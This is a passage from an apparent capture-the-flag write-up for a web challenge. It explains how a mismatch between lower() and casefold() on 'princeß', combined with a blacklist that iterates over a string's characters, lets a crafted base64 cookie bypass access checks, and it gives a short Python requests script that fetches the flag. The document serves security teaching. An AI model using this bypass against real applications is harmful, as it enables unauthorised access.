</code></pre></div>

<p>Considering the target psyduck is <code>princess</code>, this is an obvious vulnerability: <code>forbidden_psy</code> will evaluate, that <code>"princeß".lower() not in forbiddenPsyducks</code>, giving the green light, whereas the main function will evaluate, that <code>"princeß".casefold() in allPsyducks</code>.</p>
<p>This bypasses two of the given requirements. The first can be bypassed, simply by having "princeß" in our cookie. The second is also bypassed, simply by not including "princess" in the cookie.</p>
<p>The 5th however, is a bit harder. It actually causes a bit of a paradox: <code>"princeß".casefold()</code> being "princess" must be contained within the cookie. But as i mentioned earlier, this cannot be: This would trigger the second requirement.</p>
<p>The solution is a common display of how programs must rigorously check the user inputs type. Passing the cookie as a string, manages to bypass this. It's to do with how it checks the blacklist:</p>
<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">check_favorite_forbidden</span><span class="p">(</span><span class="n">favourite_psyducks</span><span class="p">:</span><span class="nb">list</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">favourite_psyduck</span> <span class="ow">in</span> <span class="n">favourite_psyducks</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">favourite_psyduck</span> <span class="ow">in</span> <span class="n">forbiddenPsyducks</span><span class="p">:</span>
            <span class="k">return</span> <span class="kc">False</span>
    <span class="k">return</span> <span class="kc">True</span>
</code></pre></div>

<p>Python allows iteration over string as an iteration over the characters of the string. At the same time, checking whether <code>str in str</code>, is equivalent to checking if the second string contains the first string.</p>
<p>Therefore:</p>
<ul>
<li>
<p><code>user_request=princeß</code></p>
</li>
<li>
<p><code>user_cookie={"psy": "princeßprincess"}</code><br />
bypasses the blacklist.</p>
</li>
</ul>
<hr />
<h3>Solution</h3>
<p>I wrote this simple script to get the flag:</p>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">json</span>

<span class="n">psyduck</span> <span class="o">=</span> <span class="s2">&quot;princeß&quot;</span>
<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;MyFavoritePsyducks&quot;</span><span class="p">:</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&quot;psy&quot;</span><span class="p">:</span> <span class="s2">&quot;princeßprincess&quot;</span><span class="p">})</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()}</span>

<span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;http://psyducks.hkn:80/content?psyduck=</span><span class="si">{</span><span class="n">psyduck</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;princess.png&quot;</span><span class="p">,</span> <span class="s2">&quot;w+b&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
</code></pre></div>

<p>This spits out a png with the flag:</p>
<p><img alt="" src="princess.png" /></p>
            </div>
        
        
    </div>

    </body>
</html>